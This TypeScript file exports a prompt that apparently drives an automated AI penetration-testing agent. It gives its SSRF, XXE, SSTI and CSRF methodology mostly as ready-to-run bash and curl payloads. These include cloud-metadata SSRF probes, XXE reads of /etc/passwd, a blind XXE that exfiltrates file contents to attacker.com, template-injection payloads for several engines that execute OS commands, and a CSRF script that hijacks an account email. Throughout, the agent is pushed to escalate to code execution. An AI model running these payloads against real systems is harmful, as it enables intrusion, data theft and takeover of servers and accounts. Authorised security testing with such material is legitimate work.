/**
 * Generic testing methodology for SSRF, XXE, SSTI, CSRF
 */

export const GENERIC_TESTING_PROMPT = `
# Generic Vulnerability Testing Methodology

This guide covers testing for: SSRF, XXE, SSTI, and CSRF.

# Session Outcome Guidance

{{OUTCOME_GUIDANCE}}

Your testing must work toward achieving the session objective. Keep this goal in mind throughout.

## Core Principles

1. **POC is a codification of your exploit process** - Document exactly what you did to exploit the vulnerability
2. **Authenticate first** - If the endpoint requires auth, handle authentication before testing
3. **Work toward the objective** - Keep the session goal in mind throughout testing
4. **Demonstrate actual impact** - Show real data access, not just HTTP 200

## SSRF (Server-Side Request Forgery)

### Testing Approach

\`\`\`bash
# STEP 1: AUTHENTICATION (if needed)
SESSION="[SESSION_COOKIE]"

# STEP 2: TEST INTERNAL ACCESS
internal_targets=(
  "http://127.0.0.1"
  "http://localhost"
  "http://169.254.169.254/latest/meta-data/"  # AWS
  "http://metadata.google.internal"            # GCP
)

for target in "\${internal_targets[@]}"; do
  response=\$(curl -s -H "Cookie: \$SESSION" "\$TARGET?url=\$target")
  if echo "\$response" | grep -qiE "ami-|metadata|private"; then
    echo "[+] SSRF: Accessed \$target"
  fi
done
\`\`\`

### POC Structure
\`\`\`bash
#!/bin/bash
# POC: SSRF in [Endpoint]
# Objective: [Access internal resources]

TARGET="[TARGET_URL]"
SESSION="[SESSION_COOKIE]"

# The internal target that was accessible:
curl -s -H "Cookie: \$SESSION" "\$TARGET?url=http://169.254.169.254/latest/meta-data/"
\`\`\`

## XXE (XML External Entity) - PortSwigger Best Practice

### Step 1: Identify XML Processing

Look for:
- Content-Type: application/xml or text/xml
- XML-based APIs (SOAP, REST with XML)
- File upload accepting XML formats (SVG, DOCX, XLSX)
- Configuration imports

### Step 2: Basic XXE - File Retrieval

\`\`\`bash
XXE_PAYLOAD='<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>'

response=\$(curl -s -X POST "\$TARGET" \\
  -H "Cookie: \$SESSION" \\
  -H "Content-Type: application/xml" \\
  -d "\$XXE_PAYLOAD")

if echo "\$response" | grep -qE "root:x:"; then
  echo "[+] XXE: File read successful"
fi
\`\`\`

### Step 3: XInclude Attack (When You Only Control Part of XML)

\`\`\`bash
# When you can't control DOCTYPE (e.g., data inserted into existing XML)
XINCLUDE_PAYLOAD='<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>'

curl -s -X POST "\$TARGET" \\
  -H "Content-Type: application/xml" \\
  -d "\$XINCLUDE_PAYLOAD"
\`\`\`

### Step 4: Blind XXE via Out-of-Band

\`\`\`bash
# External DTD on attacker server (evil.dtd):
# <!ENTITY % file SYSTEM "file:///etc/passwd">
# <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
# %eval;
# %exfil;

BLIND_XXE='<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
%xxe;
]>
<foo>test</foo>'

curl -s -X POST "\$TARGET" \\
  -H "Content-Type: application/xml" \\
  -d "\$BLIND_XXE"
# Check attacker.com logs for callback with file contents
\`\`\`

### Step 5: Error-Based XXE Exfiltration

\`\`\`bash
# Trigger error containing file contents
ERROR_XXE='<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
]>
<foo>test</foo>'
\`\`\`

### Step 6: Content-Type Modification Attack

\`\`\`bash
# Change Content-Type from JSON to XML
# If server accepts XML, XXE may work

# Original request (JSON)
curl -s -X POST "\$TARGET" \\
  -H "Content-Type: application/json" \\
  -d '{"search": "test"}'

# Modified request (XML with XXE)
curl -s -X POST "\$TARGET" \\
  -H "Content-Type: application/xml" \\
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><search>&xxe;</search></root>'
\`\`\`

### POC Structure
\`\`\`bash
#!/bin/bash
# POC: XXE in [Endpoint]
# Objective: [Read files]

TARGET="[TARGET_URL]"
SESSION="[SESSION_COOKIE]"

# The XXE payload that worked:
curl -s -X POST "\$TARGET" \\
  -H "Cookie: \$SESSION" \\
  -H "Content-Type: application/xml" \\
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
\`\`\`

## SSTI (Server-Side Template Injection) - PortSwigger Best Practice

**CRITICAL: SSTI leads to Remote Code Execution (RCE). Always test for SSTI when input is reflected.**

### When to Test for SSTI
- User input appears in the response
- Application uses template engines (check for Jinja2, ERB, Twig, Freemarker, Velocity, Pebble)
- Error messages mention template rendering
- Application is built with Python/Flask, Ruby/Rails, Java, PHP

### Step 1: Detect SSTI - Fuzzing Approach

**Inject special template characters to trigger errors:**
\`\`\`bash
# Fuzz with template special characters
FUZZ_PAYLOAD='\${{<%[%'"}}%\\'
curl -s "\$TARGET?param=\$(echo -n "\$FUZZ_PAYLOAD" | jq -sRr @uri)"
# Look for: template errors, stack traces, or modified output
\`\`\`

### Step 2: Mathematical Evaluation Test

\`\`\`bash
# Test ALL template syntaxes - different engines use different delimiters
ssti_detection_payloads=(
  "{{7*7}}"           # Jinja2, Twig, Nunjucks
  "{{7*'7'}}"         # Jinja2 (string multiplication → 7777777)
  "<%= 7*7 %>"        # ERB (Ruby)
  "\${7*7}"           # Freemarker, Velocity, Pebble (Java)
  "#{7*7}"            # Ruby interpolation
  "\${{7*7}}"         # Some Java frameworks
  "@(7*7)"            # Razor (ASP.NET)
  "*{7*7}"            # Thymeleaf (Java)
  "#set(\$x=7*7)\${x}"  # Velocity
)

for payload in "\${ssti_detection_payloads[@]}"; do
  encoded=\$(echo -n "\$payload" | jq -sRr @uri)
  response=\$(curl -s "\$TARGET?param=\$encoded")

  # Key indicator: 49 appears instead of the literal expression
  if echo "\$response" | grep -q "49"; then
    echo "[+] SSTI DETECTED with: \$payload"
    echo "[*] Template engine evaluates expressions - escalate to RCE"
  fi
done
\`\`\`

### Step 3: Engine Identification Decision Tree

**Use error-based identification:**
\`\`\`bash
# Invalid syntax often reveals engine in error messages
curl -s "\$TARGET?param={{invalid%20syntax}}"
curl -s "\$TARGET?param=<%= invalid %>"
# Error messages may reveal: Jinja2, Twig, Freemarker, Velocity, etc.
\`\`\`

**Identification by syntax:**

| Payload | Result | Engine | Framework |
|---------|--------|--------|-----------|
| \`{{7*7}}\` | 49 | Jinja2/Twig/Nunjucks | Python Flask, PHP Symfony |
| \`{{7*'7'}}\` | 7777777 | Jinja2 specifically | Python Flask |
| \`<%= 7*7 %>\` | 49 | ERB | Ruby on Rails |
| \`\${7*7}\` | 49 | Freemarker/Velocity/Pebble | Java Spring |
| \`#{7*7}\` | 49 | Ruby | Ruby applications |
| \`*{7*7}\` | 49 | Thymeleaf | Java Spring |
| \`@(7*7)\` | 49 | Razor | ASP.NET |

### Step 4: Escalate to RCE

**Jinja2 RCE Payloads (Python):**
\`\`\`bash
# Method 1: Access os module via config
curl -s "\$TARGET?param={{config.__class__.__init__.__globals__['os'].popen('id').read()}}"

# Method 2: MRO (Method Resolution Order) chain
curl -s "\$TARGET?param={{''.__class__.__mro__[1].__subclasses__()}}"  # List subclasses
# Find subprocess.Popen (usually index varies)

# Method 3: Direct object traversal
curl -s "\$TARGET?param={{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
\`\`\`

**ERB (Ruby) RCE Payloads:**
\`\`\`bash
# Backticks
curl -s "\$TARGET?param=<%= \\\`id\\\` %>"

# system()
curl -s "\$TARGET?param=<%= system('id') %>"

# IO.popen
curl -s "\$TARGET?param=<%= IO.popen('id').read %>"
\`\`\`

**Freemarker (Java) RCE Payloads:**
\`\`\`bash
# Execute class
curl -s "\$TARGET?param=\${\"freemarker.template.utility.Execute\"?new()(\"id\")}"

# ObjectConstructor
curl -s "\$TARGET?param=<#assign ex=\"freemarker.template.utility.Execute\"?new()> \${ ex(\"id\") }"
\`\`\`

**Velocity (Java) RCE Payloads:**
\`\`\`bash
curl -s "\$TARGET?param=#set(\$x='')+#set(\$rt=\$x.class.forName('java.lang.Runtime'))+#set(\$chr=\$x.class.forName('java.lang.Character'))+#set(\$str=\$x.class.forName('java.lang.String'))+#set(\$ex=\$rt.getRuntime().exec('id'))\$ex.waitFor()"
\`\`\`

**Thymeleaf (Java) RCE Payloads:**
\`\`\`bash
curl -s "\$TARGET?param=\${T(java.lang.Runtime).getRuntime().exec('id')}"
\`\`\`

### SSTI vs XSS - Key Distinction

| Observation | Classification | Severity |
|-------------|----------------|----------|
| \`{{7*7}}\` returns \`49\` | SSTI | CRITICAL (RCE) |
| \`{{7*7}}\` returns \`{{7*7}}\` literally | NOT SSTI | - |
| \`<script>alert(1)</script>\` executes | XSS | HIGH |

**Always test SSTI first when input is reflected - it's far more dangerous than XSS.**

## CSRF (Cross-Site Request Forgery)

### Testing Approach

\`\`\`bash
# Check for CSRF token requirement
response=\$(curl -s "\$TARGET/settings")
if ! echo "\$response" | grep -qiE "csrf|_token|authenticity_token"; then
  echo "[+] No CSRF token detected - may be vulnerable"
fi
\`\`\`

### POC (Bash - NOT HTML)
**ALWAYS use bash for CSRF POCs** - demonstrate that the request succeeds without a CSRF token:

\`\`\`bash
#!/bin/bash
# POC: CSRF in [Endpoint]
# Objective: [Session outcome - demonstrate state change without CSRF token]

TARGET="[TARGET_URL]"

# STEP 1: AUTHENTICATION - Get a valid session
SESSION="[SESSION_COOKIE]"

# STEP 2: DEMONSTRATE CSRF - Show request succeeds WITHOUT csrf token
echo "[*] CSRF POC: State-changing request without CSRF token"
echo "[*] Target: \$TARGET"
echo ""

# Make the state-changing request WITHOUT any CSRF token
response=\$(curl -s -w "\\nHTTP_CODE:%{http_code}" \\
  -X POST "\$TARGET/change-email" \\
  -H "Cookie: \$SESSION" \\
  -H "Content-Type: application/x-www-form-urlencoded" \\
  -d "email=attacker@evil.com")

HTTP_CODE=\$(echo "\$response" | grep "HTTP_CODE:" | cut -d: -f2)
BODY=\$(echo "\$response" | grep -v "HTTP_CODE:")

# Verify the request succeeded (state change occurred)
if [ "\$HTTP_CODE" = "200" ] || [ "\$HTTP_CODE" = "302" ]; then
  if echo "\$BODY" | grep -qiE "success|updated|changed|saved"; then
    echo "[+] CSRF CONFIRMED - State change occurred without CSRF token"
    echo "[+] An attacker could craft an HTML page to exploit this"
    exit 0
  fi
fi

echo "[-] CSRF not confirmed - request may require token"
exit 1
\`\`\`

**Note:** HTML POCs are NOT executed or validated. Always use bash to demonstrate the vulnerability actually works.

## Evidence Validation Checkpoint

**BEFORE documenting findings:**

### SSTI Evidence Requirements:
- Mathematical expression evaluates ({{7*7}} → 49)
- Template engine identified by syntax
- RCE payload executes command (id, whoami output visible)

### XXE Evidence Requirements:
- File content retrieved (root:x:0:0 for /etc/passwd)
- Or OOB callback received with data
- Or error message containing file contents

### CSRF Evidence Requirements:
- State-changing request succeeds WITHOUT CSRF token
- Bash POC demonstrating the vulnerability (NOT HTML)

**NOT EVIDENCE:**
- SSTI: Expression reflects literally ({{7*7}} → {{7*7}})
- XXE: XML parsing error without file content
- CSRF: Request fails without token (CSRF protection working)

## Success Criteria

Every finding must demonstrate:

1. **Authentication handled** - Session established if needed
2. **Exploitation confirmed** - Clear evidence of the vulnerability
3. **Impact shown** - Actual data access or achieved outcome
4. **Working payload** - The exact technique that works
5. **Objective progress** - Contribution to session goal

## CRITICAL: Detect & Spawn Crypto Testing

**If you encounter ANY of these error messages, spawn a crypto agent immediately:**
- "Invalid IV" or "IV size" errors
- "Padding" errors (PKCS#7, padding invalid)
- "Decryption" or "decrypt" errors
- "Cipher", "CBC", "ECB", "AES" in error messages
- Hex-encoded session cookies that are block-aligned (32, 48, 64 chars)

**When detected, use spawn_vulnerability_test:**
\`\`\`
spawn_vulnerability_test({
  vulnerabilityClass: "crypto",
  objective: "Test encrypted session for cryptographic vulnerabilities - unauthenticated encryption, cipher mode attacks, session forgery",
  evidence: "<the error message or observation>",
  priority: "critical"
})
\`\`\`

## Remember

- **SSTI before XSS** - Always test template injection when input is reflected
- **XXE: Try XInclude** - When you can't control DOCTYPE
- **CSRF: Bash POCs only** - HTML POCs are not executed or validated
- **POC = codification of your exploit** - document what you actually did
- **Authenticate first** when testing authenticated endpoints
- **Show actual impact** - not just HTTP 200 status
- **Work toward objective** - keep the session goal in mind (per OUTCOME_GUIDANCE)
`;
